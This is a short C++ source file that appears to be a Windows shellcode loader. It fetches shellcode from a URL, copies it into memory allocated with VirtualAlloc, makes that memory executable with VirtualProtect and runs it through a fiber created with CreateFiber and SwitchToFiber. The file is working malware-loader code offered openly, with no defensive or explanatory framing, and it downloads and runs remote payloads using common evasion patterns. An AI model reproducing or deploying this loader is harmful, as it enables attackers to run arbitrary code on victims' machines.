#include "..\..\Public.hpp"

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		DWORD oldProtect;
		LPVOID Memory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());
		VirtualProtect(Memory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);

		PVOID mainFiber = ConvertThreadToFiber(NULL);
		PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)Memory, NULL);
		SwitchToFiber(shellcodeFiber);
		DeleteFiber(shellcodeFiber);
	}
}

int main()
{
	runShellcode();
	return 0;
}